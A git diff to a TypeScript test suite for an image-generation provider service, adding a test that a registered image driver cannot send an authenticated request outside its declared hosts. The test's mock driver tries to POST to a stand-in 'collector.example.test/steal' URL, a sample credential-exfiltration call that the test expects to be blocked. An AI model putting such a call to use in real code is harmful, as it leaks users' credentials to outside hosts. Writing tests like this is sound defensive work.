@@ -13,9 +13,10 @@ import {
   type ProviderDriverKind,
   type ProviderInstance,
 } from "@octant/contracts";
-import type {
-  ImageGenerationAdapter,
-  ImageGenerationDriver,
+import {
+  sanitizeImageFailure,
+  type ImageGenerationAdapter,
+  type ImageGenerationDriver,
 } from "@octant/provider-sdk/image-generation";
 import { Journal } from "../persistence/journal";
 import { ConcurrencyConflict } from "../persistence/journalErrors";
@@ -142,6 +143,7 @@ function openHarness(
     readonly ideogramInstance?: ProviderInstance;
     readonly fetch?: ImageHttpFetch;
     readonly imageDrivers?: ReadonlyArray<ImageGenerationDriver>;
+    readonly resolveCredential?: () => Promise<string>;
     readonly admittedImageDriverKinds?: ReadonlySet<ProviderDriverKind>;
   } = {},
 ) {
@@ -207,7 +209,10 @@ function openHarness(
       return undefined;
     },
     readImageGenerationCustomSources: () => options.customSources ?? [],
-    credentialResolver: { has: async () => true, resolve: async () => "sk-test" },
+    credentialResolver: {
+      has: async () => true,
+      resolve: options.resolveCredential ?? (async () => "sk-test"),
+    },
     uuid: () => crypto.randomUUID(),
     clock: () => new Date(clockMs++).toISOString(),
     actor,
@@ -928,6 +933,7 @@ describe("image providers behind the image seam", () => {
     const seen: Array<string> = [];
     const driver: ImageGenerationDriver = {
       driverKind: "bfl-image",
+      providerHosts: ["images.example.test"],
       create: ({ instance, ports }) => ({
         generate: async () => {
           seen.push(String(instance.id));
@@ -962,6 +968,47 @@ describe("image providers behind the image seam", () => {
     expect(completed.status).toBe("completed");
     expect(seen).toEqual([String(bflId)]);
     expect(fetch).toHaveBeenCalledTimes(1);
+  });
+
+  it("refuses a registered image driver's call outside its declared hosts before reading the credential", async () => {
+    const fetch = vi.fn(async () => new Response(png, { status: 200 }));
+    const resolve = vi.fn(async () => "sk-test");
+    const driver: ImageGenerationDriver = {
+      driverKind: "bfl-image",
+      providerHosts: ["images.example.test"],
+      create: ({ ports }) => ({
+        generate: async () => {
+          try {
+            await ports.request({
+              url: "https://collector.example.test/steal",
+              method: "POST",
+              auth: { header: "x-seam-key" },
+            });
+            return { status: "completed", images: [] };
+          } catch (error) {
+            return { status: "failed", providerFailure: sanitizeImageFailure(error) };
+          }
+        },
+      }),
+    };
+    const { service } = openHarness(undefined, {
+      bflInstance: bflInstance(),
+      fetch,
+      imageDrivers: [driver],
+      resolveCredential: resolve,
+    });
+    const queued = await service.enqueue({
+      threadKind: "chat-thread",
+      scopeId,
+      profileInstanceId: bflId,
+      modelId: bflModelId,
+      prompt: "a red cube",
+    });
+    const failed = await service.whenTerminal(queued.id);
+    expect(failed.status).toBe("failed");
+    expect(failed.failure?.category).toBe("unauthorized");
+    expect(resolve).not.toHaveBeenCalled();
+    expect(fetch).not.toHaveBeenCalled();
   });
 
   it("fails a job as unsupported without calling the provider when its image driver plugin is disabled", async () => {
